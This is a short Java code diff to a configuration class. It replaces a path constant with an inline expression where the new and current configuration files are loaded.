@@ -88,7 +88,7 @@ public final class Conf {
     public static final String NEW_CONF = "1";//"newconfig.dat";
     public static final String ACTUAL_CONF = "2";//"config.dat";
     private static final String FORCED_CONF = "3";//"config.bin";
-    public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
+    //public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
 
     /** The Constant CONF_TIMER_SINGLE. */
     public static final int CONF_TIMER_SINGLE = 0x0;
@@ -215,7 +215,7 @@ public final class Conf {
         }
         //#endif
 
-        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.NEW_CONF, true);
+        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: new config");
@@ -237,7 +237,7 @@ public final class Conf {
             }
         }
 
-        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.ACTUAL_CONF, true);
+        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: actual config");
